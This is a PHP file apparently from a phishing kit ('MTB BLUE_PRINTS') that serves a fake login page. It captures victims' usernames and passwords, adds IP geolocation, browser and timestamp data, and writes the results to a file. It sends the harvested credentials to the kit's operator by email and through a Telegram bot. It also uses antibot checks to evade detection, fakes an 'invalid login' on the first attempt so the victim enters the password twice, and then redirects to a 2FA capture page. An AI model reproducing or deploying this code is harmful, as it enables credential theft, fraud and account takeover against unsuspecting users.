<?php
session_start();
require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }
    include '../../crawlerdetect.php';
include "../conf/config.php";
include 'recon.php';
if($_POST){
    $usr  = $_POST['usr'];
    $_SESSION['usr'] = $usr;
	$pass 	  = $_POST['pasd'];
    $_SESSION['pass'] = $pass;
if($d_log == "on"){}else{
    $ff = fopen("log_db",'a');
    fwrite($ff,$ip."\n");
    fclose($ff);
    }

$ck = file_get_contents('log_db');

    if(strpos($ck, $ip) !== false){
        //log2 if enabled else log2
        $body = ":::::::  MTB BLUE_PRINTS [Dual Login Details] ::::::::::::::\r\n";
        $body .= "User                                   : $usr\r\n";
        $body .= "Password                               : $pass\r\n";
        $body .=  "|--------------- I N F O | I P -------------------|\r\n";
        $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
        $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
        $body .= "IP City	                           : {$_SESSION['city']}\r\n";
        $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
        $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
        $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
        $body .= "::::::::::::::::  MTB BLUE_PRINTS 1nf0 :::::::::::::::::\r\n";
        if($savetxt == "on"){
          $save=fopen("../data/login".$salt.".txt",'a');
          fwrite($save,$body);
          fclose($save);
          }            
        $subject="Login 2 By BLUE_PR1NTS=> From {$_SESSION['ip']} [ {$_SESSION['platform']} ]";

        $headers="From: BLUE_PR1NTS <MTB@BLUE_PRINTS.com>\r\n";
        $headers.="MIME-Version: 1.0\r\n";
        $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($emailzz, $subject, $body, $headers);
        if($tgresult == "on"){$settings = include '../conf/settings.php';$data = $body;$send = ['chat_id'=>$settings['chat_id'],'text'=>$data];$website = "https://api.telegram.org/{$settings['bot_url']}";$ch = curl_init($website . '/sendMessage');curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);$result = curl_exec($ch);curl_close($ch);}
        $b = file_get_contents('log_db');
        $c = preg_replace($ip, '', $b);
        file_put_contents("log_db", $c);

        header("Location: ../../2fa.php?token={$_SESSION['token']}");

    }else{
        //log1 if enabled else noting
        $body = "::::::::::  MTB BLUE_PRINTS 1nf0 [Login Details] ::::::::::::::\r\n";
        $body .= "User                                   : $usr\r\n";
        $body .= "Password                               : $pass\r\n";
        $body .=  "|--------------- I N F O | I P -------------------|\r\n";
        $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
        $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
        $body .= "IP City	                           : {$_SESSION['city']}\r\n";
        $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
        $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
        $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
        $body .= "::::::::::::::::  MTB BLUE_PRINTS 1nf0 :::::::::::::::::\r\n";
        if($savetxt == "on"){
          $save=fopen("../data/login".$salt.".txt",'a');
          fwrite($save,$body);
          fclose($save);
          }            
        $subject="Login By BLUE_PR1NTS=> From {$_SESSION['ip']} [ {$_SESSION['platform']} ]";

        $headers="From: BLUE_PR1NTS <MTB@BLUE_PRINTS.com>\r\n";
        $headers.="MIME-Version: 1.0\r\n";
        $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($emailzz, $subject, $body, $headers);
        if($tgresult == "on"){$settings = include '../conf/settings.php';$data = $body;$send = ['chat_id'=>$settings['chat_id'],'text'=>$data];$website = "https://api.telegram.org/{$settings['bot_url']}";$ch = curl_init($website . '/sendMessage');curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);$result = curl_exec($ch);curl_close($ch);}
        $ff = fopen("log_db",'a');
        fwrite($ff,$ip."\n");
        fclose($ff);


        header("Location: ../../login.php?invalid&token={$_SESSION['token']}");

    }
}else{
    exit(header("HTTP/1.0 404 Not Found"));
}
?>